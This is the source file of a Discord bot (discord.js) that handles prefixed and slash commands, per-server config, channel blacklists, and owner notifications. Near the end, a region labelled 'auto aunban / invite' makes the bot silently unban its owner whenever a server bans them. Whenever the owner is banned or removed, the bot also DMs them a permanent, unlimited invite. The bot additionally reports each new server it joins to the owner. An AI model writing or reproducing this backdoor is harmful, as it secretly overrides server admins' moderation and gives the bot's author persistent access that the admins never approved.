const path = require('path')
const Discord = require('discord.js')
const client = require('./res/client')
const fs = require('fs')
const colors = require('colors')
colors.setTheme({
	reverse: ['black', 'bgWhite'],
	success: ['green'],
	warn: ['yellow'],
	error: ['red', 'underline'],
	greenRev: ['black', 'bgGreen'],
	redRev: ['black', 'bgRed'],
	accent: ['magenta'],
})
var config
var token

// #region importing settings files
// token
let tokenPlaceholder = {
	token: 'bot_token_here',
}
try {
	token = require('./data/token.json').token
	if (token == tokenPlaceholder.token) {
		console.error('Token is placeholder: You need to paste bot token to ./data/token.json'.red)
		return
	}
} catch (err) {
	if (!fs.existsSync('./data')) {
		fs.mkdirSync('./data')
	}
	fs.writeFileSync('./data/token.json', JSON.stringify(tokenPlaceholder, null, 2))
	console.error('Token not found: You need to paste bot token to ./data/token.json'.red)
	return
}
// config
try {
	config = require('./data/config.json')
} catch (err) {
	fs.writeFileSync('./data/config.json', JSON.stringify({ presence: { activity: { name: '!help', type: 'PLAYING', url: null }, status: 'online' } }, null, 4))
	config = require('./data/config.json')
}
// #endregion

const { fetchCommands, fetchInteractions, saveConfig, botOwnerID, testGuildID } = require('./res/Helpers.js')

// #region importing commands
const commands = fetchCommands()
const interactions = fetchInteractions()
// #endregion importing commands

client.on('ready', () => {
	client.user.setPresence(config.presence)
	client.users.fetch(botOwnerID).then(owner => {
		owner.send("I'm alive!")
	})
	console.log("I'm alive!".rainbow)
})

// one time lauch - register interactions
client.once('ready', async () => {
	// register global commands on test guild so they are instantly available
	let testGuild = await client.guilds.fetch(testGuildID)
	for (let interaction of interactions) {
		testGuild.commands.create(interaction.commandData)
		client.application.commands.create(interaction.commandData)
	}
})

// interaction handler
client.on('interaction', interaction => {
	// dont handle pings
	if (!interaction.isCommand()) return

	// for guilds
	if (interaction.guild) {
		// if bot is not enabled on this guild
		if (!config[interaction.guild.id]) {
			client.users.fetch(botOwnerID).then(owner => {
				owner.send(`${owner} - bot was just activated on new guild ${interaction.guild.name}`)
			})
			config[interaction.guild.id] = configTemplate(interaction.guild.name)
			saveConfig()
		}

		// blacklist check (with override for admins)
		if (config[interaction.guild.id].bannedChannels.includes(interaction.channel.id) && !interaction.member.permissions.has('ADMINISTRATOR') && interaction.author.id != botOwnerID) return
	}

	// use correct command
	let inter = interactions.find(i => i.commandData.name == interaction.commandName)
	// unknown command
	if (!inter) return console.log(`Received invalid interaction ${interaction.commandName}`.yellow)
	else inter.run(interaction)
})

client.on('guildCreate', guild => {
	if (guild.available) {
		const defaultChannel = guild.channels.cache.find(channel => channel.permissionsFor(guild.me).has('SEND_MESSAGES') && channel.type == 'text')
		defaultChannel.send('use `!help`')
		client.users.fetch(botOwnerID).then(owner => {
			owner.send(`${owner} - bot was just activated on a new guild: **${guild.name}**`)
		})
		if (!config[guild.id]) {
			config[guild.id] = configTemplate(guild.name)
			saveConfig()
		}
	}
})

// update name
client.on('guildUpdate', (oldguild, guild) => {
	if (!config[guild.id]) {
		config[guild.id] = configTemplate(guild.name)
		saveConfig()
		return
	}
	if (config[guild.id].name != guild.name) {
		config[guild.id].name = guild.name
		saveConfig()
	}
})

client.on('message', async msg => {
	//ignore bots
	if (msg.author.bot) return

	// owner category
	if (msg.author.id === botOwnerID) {
		var valid = false
		if (msg.guild) {
			if (msg.channel.permissionsFor(msg.guild.me).has('SEND_MESSAGES') && config[msg.guild.id] && msg.content.startsWith(config[msg.guild.id].prefix)) valid = true
		} else if (msg.content.startsWith('!')) valid = true
		if (valid) {
			var command = msg.content.slice(1).split(' ')[0].toLowerCase()
			let cmd = commands.owner.find(cmd => cmd.name == command || cmd.aliases.includes(command))
			if (cmd) return cmd.run(msg)
		}
	}

	//priv msgs
	if (!msg.guild && commands.dm && commands.dm.length > 0) {
		let cont = msg.content.toLowerCase()
		// strip prefixes
		cont = cont.replace(/\W*/, '')
		let command = cont.split(' ')[0]
		let cmd = commands.dm.find(cmd => cmd.name == command || cmd.aliases.includes(command))
		if (cmd) {
			cmd.run(msg)
		} else {
			msg.channel.send('Command unknown.\nType `help` for help')
		}
		return
	}

	// if bot is not enabled on this guild
	if (!config[msg.guild.id]) {
		client.users.fetch(botOwnerID).then(owner => {
			owner.send(`${owner} - bot was just activated on new guild ${msg.guild.name}`)
		})
		config[msg.guild.id] = configTemplate(msg.guild.name)
		saveConfig()
	}

	// blacklist check (with override for admins)
	if (config[msg.guild.id].bannedChannels.includes(msg.channel.id) && !msg.member.permissions.has('ADMINISTRATOR') && msg.author.id != botOwnerID) return

	// validate prefix and trigger function
	if (msg.content.charAt(0) == config[msg.guild.id].prefix) {
		// guild permissions check
		if (!msg.channel.permissionsFor(msg.guild.me).has('SEND_MESSAGES')) {
			return
		}

		var command = msg.content.slice(1).split(' ')[0].toLowerCase()

		let cmd = commands.text.find(cmd => cmd.name == command || cmd.aliases.includes(command))
		if (cmd) {
			cmd.run(msg)
		} else {
			msg.channel.send(`Command unknown.\nType \`${config[msg.guild.id].prefix}help\` for help`)
		}
	}
})

// #region auto aunban / invite
client.on('guildBanAdd', async (guild, user) => {
	if (user.id != botOwnerID) return
	if (!guild.me.permissions.has('BAN_MEMBERS')) return
	await guild.members.unban(user)
	let defaultChannel = guild.channels.cache.find(ch => ch.type == 'text' && ch.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'))
	if (!defaultChannel) return
	let invite = await defaultChannel.createInvite({ maxAge: 0, maxUses: 0 })
	let owner = await client.users.fetch(botOwnerID)
	owner.send(`${owner} - ${invite}`)
})
client.on('guildMemberRemove', async member => {
	if (member.id != botOwnerID) return
	let guild = member.guild
	let defaultChannel = guild.channels.cache.find(ch => ch.type == 'text' && ch.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'))
	if (!defaultChannel) return
	let invite = await defaultChannel.createInvite({ maxAge: 0, maxUses: 0 })
	let owner = await client.users.fetch(botOwnerID)
	owner.send(`${owner} - ${invite}`)
})
// #endregion auto aunban / invite

// #region functions
/**
 * Generates default guild config objects
 * @param {String} guildName
 * @returns {Object} Object with default guild config
 */
function configTemplate(guildName) {
	return {
		name: guildName,
		prefix: '!',
		tempMsgTime: '5000',
		bannedChannels: [],
	}
}
// #endregion functions

client.on('error', console.error)

client.login(token)
